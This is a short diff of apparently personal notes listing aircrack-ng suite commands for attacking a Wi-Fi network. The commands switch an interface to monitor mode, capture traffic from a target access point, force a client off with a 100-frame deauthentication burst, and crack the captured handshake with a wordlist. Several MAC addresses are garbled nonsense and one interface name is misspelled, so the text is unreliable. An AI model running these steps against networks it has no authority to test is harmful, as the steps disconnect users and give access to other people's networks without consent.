@@ -42,3 +42,25 @@ ifconfig wlan0 up
 
 
 airmon-ng start wlan0
+
+
+
+
+
+
+
+iwconfig
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+airodump-ng wlan0
+
+airodump-ng wlna0 --bssid f4:fdsd:dfs: --channel 11 --write test
+
+
+aireplay-ng --deauth 100 -a 7c:dsfd;fdss: -c rs:sdfds:dsf:d wlan0
+
+
+
+aircrack-ng haacked-o2.cap -w /usr/share/wordlist/f.txt
